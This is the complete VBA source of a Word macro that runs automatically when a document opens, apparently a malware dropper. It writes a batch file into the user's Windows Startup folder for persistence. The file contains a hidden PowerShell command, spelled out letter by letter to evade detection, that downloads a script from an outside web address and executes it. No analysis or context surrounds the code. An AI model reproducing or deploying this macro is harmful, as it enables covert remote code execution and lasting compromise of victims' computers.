Private Sub Document_Open()
Dim fso As Object
Set fso = CreateObject("Scripting.FileSystemObject")
Dim oFile As Object
Dim P As String
Dim U As String

 

U = Environ$("Username")

 

P = "C:\\users\\" & U & "\\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Word$Data$FBIEB$.bat"

 

Set oFile = fso.CreateTextFile(P)
oFile.Write "p"
oFile.Write "o"
oFile.Write "w"
oFile.Write "e"
oFile.Write "r"
oFile.Write "s"
oFile.Write "h"
oFile.Write "e"
oFile.Write "l"
oFile.Write "l"
oFile.Write " -"
oFile.Write "w"
oFile.Write " "
oFile.Write "h"
oFile.Write "i"
oFile.Write "d"
oFile.Write "d"
oFile.Write "e"
oFile.Write "n"
oFile.WriteLine " $X = (New-Object Net.WebClient).DownloadString('https://nikipreter.com:443/login.php');Invoke-Expression $X;"""
oFile.Close
Set fso = Nothing
Set oFile = Nothing
'V = Shell(P, vbHide)
End Sub